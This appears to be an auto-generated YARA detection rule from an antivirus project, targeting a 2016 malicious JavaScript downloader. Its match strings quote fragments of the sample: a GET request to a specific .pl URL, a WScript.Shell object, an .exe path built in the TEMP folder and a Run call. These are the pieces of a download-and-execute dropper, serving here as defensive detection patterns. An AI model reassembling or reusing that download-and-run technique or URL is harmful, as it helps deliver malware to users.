rule sig_20160330_814a1d47a68f496c39226ad6467a7c8a {
  meta:
    description = "datamaliciousorder - file 20160330_814a1d47a68f496c39226ad6467a7c8a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8d77f97b2d9ba403fd6c50a40ce3266de931561e1ce9a89fb5ac123e28b8644c"

  strings:
    $s1  = "WS0[DP](\"GET\", \"http://xn--po-wqa.pl/a8zkde\", false);" fullword ascii
    $s2  = "var D = function UR() {return WScript[NH](\"WScript\"+\".Shell\");}(), ZX = 11;" fullword ascii
    $s3  = "function YD(ZV, D0){NT = NT * 1; return ZV - D0;};" fullword ascii
    $s4  = "if (WS0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function S() {return D[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"YIgtc6MQRySBh9OS.ex\" + \"e\";};" fullword ascii
    $s6  = "function EC(){return Z + \"\";};" fullword ascii
    $s7  = "function OR() {return ((SN == true) && (SN == OL)) ? 1 : NT;};" fullword ascii
    $s8  = "function PW(N){D[\"Run\"](N, NT, NT);};" fullword ascii
    $s9  = "function XK()" fullword ascii
    $s10 = "}while (E);" fullword ascii
    $s11 = "function U(L) {var KP = (1, 2, 3, 4, 5, L); return KP;};" fullword ascii
    $s12 = "function R(){return NH;};" fullword ascii
    $s13 = "function WS(){return 22;};" fullword ascii
    $s14 = "var KD = new this[\"Date\"]();" fullword ascii
    $s15 = "return YD(HR0, U0);" fullword ascii
    $s16 = "var U1 = false;" fullword ascii
    $s17 = "var OL = false;" fullword ascii
    $s18 = "var SN = false;" fullword ascii
    $s19 = "OL = true; " fullword ascii
    $s20 = "SN = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}